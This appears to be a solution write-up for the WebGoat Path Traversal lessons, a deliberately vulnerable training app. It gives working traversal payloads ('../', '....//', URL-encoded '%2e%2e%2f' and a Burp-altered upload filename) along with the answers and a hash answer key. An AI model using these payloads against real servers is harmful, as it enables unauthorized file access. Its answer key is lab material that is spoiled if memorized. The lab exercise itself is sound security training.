# Path Traversal

## 2 - Path Traversal while uploading files

Full Name: `test`, Output: /home/webgoat/.webgoat-8.1.0/PathTraversal/tonnctf/test
Full Name: `../PathTraversal`, Output: Congratulations. You have successfully completed the assignment.
Full Name: `../../PathTraversal`, Output: /home/webgoat/.webgoat-8.1.0/PathTraversal/tonnctf/../../PathTraversal: Is a directory

Answer:
Full Name: `../PathTraversal`

## 3 - Path Traversal While Uploading File
Cannot use ../

Full Name: `%2e%2e%2fPathTraversal`, Output: /home/webgoat/.webgoat-8.1.0/PathTraversal/tonnctf/%2e%2e%2fPathTraversal
Full Name: `../PathTraversal`, Output: Profile has been updated, your image is available at: /home/webgoat/.webgoat-8.1.0/PathTraversal/tonnctf/PathTraversal"
Full Name: `....//PathTraversal`, Output: Congratulations. You have successfully completed the assignment.

Answer:
Full Name: `....//PathTraversal`

## 4 - Path Traversal while uploading file
The developer again became aware of the vulnerability by not validating the input of the full name input field. A fix was made in an attempt to solve this vulnerability.

Again the same assignment but can you bypass the implemented fix?

Answer:
Use burp to intercept the request, and change the filename

------WebKitFormBoundary51OQ5ABzNUi9of3a
Content-Disposition: form-data; name="uploadedFileRemoveUserInput"; filename="../250px-Dummy_Title_Card.jpeg"
Content-Type: image/jpeg

## 5 - Retrieving other files with a path traversal

Change the request URL to below via burp
```GET /WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2f```

The output 
```
/home/webgoat/.webgoat-8.1.0/PathTraversal/cats/../../data,
/home/webgoat/.webgoat-8.1.0/PathTraversal/cats/../../path-traversal-secret.jpg,
/home/webgoat/.webgoat-8.1.0/PathTraversal/cats/../../PathTraversal,
/home/webgoat/.webgoat-8.1.0/PathTraversal/cats/../../ClientSideFiltering,
/home/webgoat/.webgoat-8.1.0/PathTraversal/cats/../../test,
/home/webgoat/.webgoat-8.1.0/PathTraversal/cats/../../XXE
```

Steps:
1. Turn on the interceptor when click on "Show random cat picture", and change its URL to
```GET /WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret HTTP/1.1```

2. The output
```You found it submit the SHA-512 hash of your username as answer```

3. In Ubuntu LTS
```echo -n tonnctf | sha512sum```

Answer: `1b6139b5ce1eb44ace1ae0001b49222de4fe2a8443fdcc5498f1aefa224233057b7e38adc89e3848f1a84d84276701c9b0262e11826eeea3887c81ebccdfdec7`

